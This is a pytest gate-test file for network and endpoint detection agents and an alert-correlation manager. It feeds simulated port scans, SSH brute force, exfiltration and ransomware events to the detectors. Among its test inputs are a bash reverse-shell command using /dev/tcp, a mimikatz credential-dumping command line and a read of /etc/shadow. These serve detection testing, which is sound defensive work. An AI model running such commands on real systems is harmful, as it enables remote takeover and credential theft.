"""
tests/phase3_gate_test.py
Phase 3 Gate Tests — NDR Agent, EDR Agent, Data Local Manager
Run: pytest tests/phase3_gate_test.py -v
All 18 tests must pass before merging phase/3-data → main.
"""
from __future__ import annotations
import json, sys, time, uuid
from collections import defaultdict, deque
from datetime import datetime, timezone
from pathlib import Path
from unittest.mock import patch

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))

from agents.data_network.ndr_agent.main import NdrAgent
from agents.data_network.edr_agent.main import EdrAgent
from managers.data_local_manager.main import DataLocalManager


# ── Factories ─────────────────────────────────────────────────────────────────

def make_ndr() -> NdrAgent:
    with patch("agents.data_network.ndr_agent.main.KafkaProducerClient"), \
         patch("agents.data_network.ndr_agent.main.KafkaConsumerClient"), \
         patch("agents.data_network.ndr_agent.main.uvicorn"):
        return NdrAgent()


def make_edr() -> EdrAgent:
    with patch("agents.data_network.edr_agent.main.KafkaProducerClient"), \
         patch("agents.data_network.edr_agent.main.KafkaConsumerClient"), \
         patch("agents.data_network.edr_agent.main.uvicorn"):
        return EdrAgent()


def make_mgr() -> DataLocalManager:
    with patch("managers.data_local_manager.main.KafkaProducerClient"), \
         patch("managers.data_local_manager.main.KafkaConsumerClient"), \
         patch("managers.data_local_manager.main.uvicorn"):
        return DataLocalManager()


def _flow(src_ip="192.168.100.50", dst_ip="10.0.60.10", dst_port=22,
          proto="tcp", status="established", bytes_out=1024):
    return {"event_type": "network_flow", "src_ip": src_ip, "dst_ip": dst_ip,
            "dst_port": dst_port, "proto": proto, "status": status,
            "bytes_out": bytes_out, "sensor": "zeek",
            "timestamp": datetime.now(timezone.utc).isoformat()}


def _endpoint(host_id="10.0.60.10", event_type="file_op", proc_name="",
              cmd_line="", file_path="", op="read", username="user"):
    return {"event_type": event_type, "host_id": host_id,
            "process_name": proc_name, "command_line": cmd_line,
            "file_path": file_path, "operation": op, "username": username,
            "sensor": "edr_endpoint",
            "timestamp": datetime.now(timezone.utc).isoformat()}


def _alert_payload(alert_type, severity="HIGH", host_id="10.0.60.10",
                   agent_type="ndr"):
    return {"alert_id": str(uuid.uuid4()), "agent_id": "ndr-agent-01",
            "agent_type": agent_type, "network_type": "data_network",
            "alert_type": alert_type, "severity": severity, "confidence": 0.92,
            "source": {"host_id": host_id, "src_ip": host_id,
                       "sensor": "zeek"},
            "details": {}, "recommended_actions": []}


# ═══════════════════════════════════════════════════════════════════════════════
# 1. NDR Agent
# ═══════════════════════════════════════════════════════════════════════════════

class TestNdrAgent:

    def test_port_scan_detected(self):
        ndr = make_ndr()
        published = []
        ndr._producer.publish = lambda t, p, key=None: published.append((t, p))

        # Send 25 flows to unique ports — exceeds threshold of 20
        for port in range(8000, 8025):
            ndr.handle_flow("data.telemetry",
                            _flow(dst_port=port, status="S0", bytes_out=64))

        alerts = [p for t, p in published if t == "data.alerts"
                  and p.get("alert_type") == "port_scan"]
        assert len(alerts) >= 1
        assert alerts[0]["severity"] == "HIGH"

    def test_brute_force_ssh_detected(self):
        ndr = make_ndr()
        published = []
        ndr._producer.publish = lambda t, p, key=None: published.append((t, p))

        for _ in range(12):
            ndr.handle_flow("data.telemetry",
                            _flow(dst_port=22, status="REJ", bytes_out=128))

        alerts = [p for t, p in published if t == "data.alerts"
                  and p.get("alert_type") == "brute_force_ssh"]
        assert len(alerts) >= 1

    def test_data_exfiltration_detected(self):
        ndr = make_ndr()
        published = []
        ndr._producer.publish = lambda t, p, key=None: published.append((t, p))

        ndr.handle_flow("data.telemetry",
                        _flow(src_ip="10.0.60.10", dst_ip="185.220.101.5",
                              dst_port=443, bytes_out=80 * 1024 * 1024))

        alerts = [p for t, p in published if t == "data.alerts"
                  and p.get("alert_type") == "data_exfiltration"]
        assert len(alerts) >= 1
        assert alerts[0]["severity"] == "CRITICAL"

    def test_unauthorized_vlan_detected(self):
        ndr = make_ndr()
        published = []
        ndr._producer.publish = lambda t, p, key=None: published.append((t, p))

        # IoT → Server subnet (isolated pair)
        ndr.handle_flow("data.telemetry",
                        _flow(src_ip="10.0.20.5", dst_ip="10.0.60.20",
                              dst_port=22, bytes_out=512))

        alerts = [p for t, p in published if t == "data.alerts"
                  and p.get("alert_type") == "unauthorized_vlan"]
        assert len(alerts) >= 1

    def test_normal_traffic_no_alert(self):
        ndr = make_ndr()
        published = []
        ndr._producer.publish = lambda t, p, key=None: published.append((t, p))

        # Small number of flows to same port — not a scan
        for _ in range(5):
            ndr.handle_flow("data.telemetry",
                            _flow(src_ip="10.0.10.20", dst_ip="10.0.10.1",
                                  dst_port=443, bytes_out=2048))

        alerts = [p for t, p in published if t == "data.alerts"]
        assert len(alerts) == 0


# ═══════════════════════════════════════════════════════════════════════════════
# 2. EDR Agent
# ═══════════════════════════════════════════════════════════════════════════════

class TestEdrAgent:

    def test_ransomware_detected(self):
        edr = make_edr()
        published = []
        edr._producer.publish = lambda t, p, key=None: published.append((t, p))

        for i in range(25):
            edr.handle_event("data.telemetry",
                             _endpoint(event_type="file_op",
                                       file_path=f"/data/file_{i:04d}.locked",
                                       op="rename"))

        alerts = [p for t, p in published if t == "data.alerts"
                  and p.get("alert_type") == "ransomware_behavior"]
        assert len(alerts) >= 1

    def test_credential_dump_detected(self):
        edr = make_edr()
        published = []
        edr._producer.publish = lambda t, p, key=None: published.append((t, p))

        edr.handle_event("data.telemetry",
                         _endpoint(event_type="file_op",
                                   proc_name="procdump.exe",
                                   file_path="/etc/shadow",
                                   op="read", username="www-data"))

        alerts = [p for t, p in published if t == "data.alerts"
                  and p.get("alert_type") == "credential_dump"]
        assert len(alerts) >= 1
        assert alerts[0]["severity"] == "CRITICAL"

    def test_suspicious_process_detected(self):
        edr = make_edr()
        published = []
        edr._producer.publish = lambda t, p, key=None: published.append((t, p))

        edr.handle_event("data.telemetry",
                         _endpoint(event_type="process",
                                   proc_name="mimikatz",
                                   cmd_line="mimikatz privilege::debug sekurlsa::logonpasswords",
                                   username="svc_account"))

        alerts = [p for t, p in published if t == "data.alerts"
                  and p.get("alert_type") == "suspicious_process"]
        assert len(alerts) >= 1

    def test_yara_reverse_shell_detected(self):
        edr = make_edr()
        published = []
        edr._producer.publish = lambda t, p, key=None: published.append((t, p))

        edr.handle_event("data.telemetry",
                         {"event_type": "command", "host_id": "10.0.60.10",
                          "command_line": "bash -i >& /dev/tcp/10.10.10.1/4444 0>&1",
                          "process_name": "bash", "username": "www-data",
                          "sensor": "edr_endpoint",
                          "timestamp": datetime.now(timezone.utc).isoformat()})

        alerts = [p for t, p in published if t == "data.alerts"
                  and p.get("alert_type") == "yara_match"]
        assert len(alerts) >= 1
        assert alerts[0]["severity"] == "CRITICAL"

    def test_normal_file_op_no_alert(self):
        edr = make_edr()
        published = []
        edr._producer.publish = lambda t, p, key=None: published.append((t, p))

        edr.handle_event("data.telemetry",
                         _endpoint(event_type="file_op",
                                   file_path="/var/log/app.log",
                                   op="write"))

        assert len(published) == 0


# ═══════════════════════════════════════════════════════════════════════════════
# 3. Data Local Manager
# ═══════════════════════════════════════════════════════════════════════════════

class TestDataLocalManager:

    def test_exfiltration_always_critical(self):
        mgr = make_mgr()
        result = mgr._reclassify({}, "data_exfiltration", "HIGH",
                                  "192.168.100.50", time.time())
        assert result == "CRITICAL"

    def test_port_scan_plus_brute_force_becomes_critical(self):
        mgr = make_mgr()
        escalated = []
        mgr._escalate = lambda inc: escalated.append(inc)
        ts = time.time()

        # First: port scan
        mgr.handle_alert("data.alerts",
                         _alert_payload("port_scan", "HIGH",
                                        host_id="192.168.100.50"))
        # Then: brute force from same IP
        mgr.handle_alert("data.alerts",
                         _alert_payload("brute_force_ssh", "HIGH",
                                        host_id="192.168.100.50"))

        critical = [i for i in mgr._incidents if i["severity"] == "CRITICAL"]
        assert len(critical) >= 1, \
            "port_scan + brute_force_ssh from same host must → CRITICAL"

    def test_ransomware_plus_cred_dump_becomes_critical(self):
        mgr = make_mgr()
        escalated = []
        mgr._escalate = lambda inc: escalated.append(inc)

        mgr.handle_alert("data.alerts",
                         _alert_payload("ransomware_behavior", "HIGH",
                                        host_id="10.0.60.10", agent_type="edr"))
        mgr.handle_alert("data.alerts",
                         _alert_payload("credential_dump", "CRITICAL",
                                        host_id="10.0.60.10", agent_type="edr"))

        critical = [i for i in mgr._incidents if i["severity"] == "CRITICAL"]
        assert len(critical) >= 1, \
            "ransomware + credential_dump on same host must → CRITICAL"

    def test_single_medium_alert_not_escalated(self):
        mgr = make_mgr()
        mgr.handle_alert("data.alerts",
                         _alert_payload("port_scan", "MEDIUM",
                                        host_id="10.0.10.20"))
        assert len(mgr._incidents) == 0, \
            "MEDIUM alert without correlation should not create incident"

    def test_high_alert_auto_escalated(self):
        mgr = make_mgr()
        escalated = []
        mgr._escalate = lambda inc: escalated.append(inc)
        mgr.handle_alert("data.alerts",
                         _alert_payload("brute_force_ssh", "HIGH"))
        assert len(escalated) == 1

    def test_critical_queued_for_approval(self):
        mgr = make_mgr()
        mgr.handle_alert("data.alerts",
                         _alert_payload("data_exfiltration", "CRITICAL"))
        assert len(mgr._pending) == 1, "CRITICAL alert must be queued for approval"


# ═══════════════════════════════════════════════════════════════════════════════
# 4. Integration (Kafka required)
# ═══════════════════════════════════════════════════════════════════════════════

def kafka_available() -> bool:
    try:
        from confluent_kafka.admin import AdminClient
        AdminClient({"bootstrap.servers": "localhost:9092"}).list_topics(timeout=2)
        return True
    except Exception:
        return False


@pytest.mark.skipif(not kafka_available(), reason="Kafka not running")
class TestPhase3FullChain:

    def test_data_exfil_reaches_data_alerts(self):
        import threading
        from confluent_kafka import Consumer
        from common.kafka_client import KafkaProducerClient, Topics

        received = []
        done = threading.Event()
        consumer = Consumer({"bootstrap.servers": "localhost:9092",
                              "group.id": f"phase3-gate-{uuid.uuid4().hex[:8]}",
                              "auto.offset.reset": "earliest"})
        consumer.subscribe([Topics.DATA_ALERTS])

        def listen():
            deadline = time.time() + 12
            while time.time() < deadline:
                msg = consumer.poll(0.5)
                if msg and not msg.error():
                    try:
                        p = json.loads(msg.value())
                        if p.get("alert_type") == "data_exfiltration":
                            received.append(p)
                            done.set()
                            return
                    except Exception:
                        pass
            done.set()

        threading.Thread(target=listen, daemon=True).start()
        time.sleep(1.0)

        prod = KafkaProducerClient("localhost:9092")
        prod.publish(Topics.DATA_ALERTS, {
            "alert_id": str(uuid.uuid4()), "agent_id": "ndr-agent-01",
            "agent_type": "ndr", "network_type": "data_network",
            "alert_type": "data_exfiltration", "severity": "CRITICAL",
            "confidence": 0.88,
            "source": {"src_ip": "10.0.60.10", "dst_ip": "185.220.101.5",
                       "sensor": "zeek"},
            "details": {"bytes_out": 83886080, "mb_out": 80.0},
            "recommended_actions": ["block_connection", "escalate_to_hq"],
        }, key="10.0.60.10")
        prod.flush()

        done.wait(timeout=12)
        consumer.close()
        assert len(received) > 0, "data_exfiltration alert must appear on data.alerts"
